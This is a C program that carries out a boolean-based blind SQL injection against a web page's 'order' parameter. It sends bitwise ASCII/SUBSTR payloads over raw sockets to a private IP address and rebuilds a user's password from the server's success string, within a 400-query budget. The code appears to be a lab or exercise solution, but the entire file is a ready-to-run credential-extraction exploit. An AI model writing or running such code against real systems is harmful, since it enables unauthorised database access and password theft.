#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MY_ID "123456789"
#define TARGET_IP "192.168.1.202"
#define TARGET_PORT 80
#define MAX_QUERIES 400
#define BUFFER_SIZE 8192
#define SUCCESS_STRING "Your order has been sent!"

static int query_counter = 0;

void url_encode(const char *src, char *dest, size_t dest_size) {
    const char *hex = "0123456789ABCDEF";
    size_t pos = 0;
    
    while (*src && pos < dest_size - 4) {
        if ((*src >= 'A' && *src <= 'Z') ||
            (*src >= 'a' && *src <= 'z') ||
            (*src >= '0' && *src <= '9') ||
            *src == '-' || *src == '_' || *src == '.' || *src == '~') {
            dest[pos++] = *src;
        } else if (*src == ' ') {
            dest[pos++] = '%';
            dest[pos++] = '2';
            dest[pos++] = '0';
        } else {
            dest[pos++] = '%';
            dest[pos++] = hex[((unsigned char)*src) >> 4];
            dest[pos++] = hex[((unsigned char)*src) & 0x0F];
        }
        src++;
    }
    dest[pos] = '\0';
}

bool check_bit(int char_pos, int bit_pos) {
    if (query_counter >= MAX_QUERIES) {
        fprintf(stderr, "Error: Query limit exceeded\n");
        return false;
    }
    query_counter++;
    
    char payload[1024];
    snprintf(payload, sizeof(payload),
        "1 AND (SELECT (ASCII(SUBSTR(pwd_col, %d, 1)) >> %d) & 1 FROM table_name WHERE id_col = '%s')",
        char_pos, bit_pos, MY_ID);
    
    char encoded_payload[4096];
    url_encode(payload, encoded_payload, sizeof(encoded_payload));
    
    char request[8192];
    snprintf(request, sizeof(request),
        "GET /index.php?order=%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        encoded_payload, TARGET_IP);
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        fprintf(stderr, "Error: Failed to create socket\n");
        return false;
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr) <= 0) {
        fprintf(stderr, "Error: Invalid address\n");
        close(sockfd);
        return false;
    }
    
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        fprintf(stderr, "Error: Connection failed\n");
        close(sockfd);
        return false;
    }
    
    size_t request_len = strlen(request);
    ssize_t bytes_sent = send(sockfd, request, request_len, 0);
    if (bytes_sent < 0 || (size_t)bytes_sent != request_len) {
        fprintf(stderr, "Error: Failed to send request\n");
        close(sockfd);
        return false;
    }
    
    char buffer[BUFFER_SIZE];
    ssize_t total_received = 0;
    ssize_t bytes_received;
    
    while ((bytes_received = recv(sockfd, buffer + total_received, 
                                   (size_t)(BUFFER_SIZE - total_received - 1), 0)) > 0) {
        total_received += bytes_received;
        if (total_received >= BUFFER_SIZE - 1) {
            break;
        }
    }
    
    close(sockfd);
    
    if (total_received <= 0) {
        fprintf(stderr, "Error: Failed to receive response\n");
        return false;
    }
    
    buffer[total_received] = '\0';
    
    return (strstr(buffer, SUCCESS_STRING) != NULL);
}

int main(void) {
    printf("Starting Boolean-based Blind SQL Injection...\n");
    printf("Query limit: %d\n\n", MAX_QUERIES);
    
    char password[64] = {0};
    int password_len = 0;
    
    for (int char_idx = 1; char_idx <= 32; char_idx++) {
        unsigned char current_char = 0;
        
        for (int bit = 7; bit >= 0; bit--) {
            bool bit_value = check_bit(char_idx, bit);
            
            if (bit_value) {
                current_char |= (unsigned char)(1 << bit);
            }
            
            printf("Char %d, Bit %d: %d (Queries: %d)\n", 
                   char_idx, bit, bit_value ? 1 : 0, query_counter);
        }
        
        if (current_char == 0) {
            break;
        }
        
        password[password_len++] = (char)current_char;
        password[password_len] = '\0';
        
        printf("Character %d: '%c' (ASCII: %d)\n", char_idx, current_char, (int)current_char);
        printf("Password so far: %s\n\n", password);
    }
    
    printf("\n=== Final Result ===\n");
    printf("Extracted password: %s\n", password);
    printf("Total queries used: %d / %d\n", query_counter, MAX_QUERIES);
    
    return 0;
}
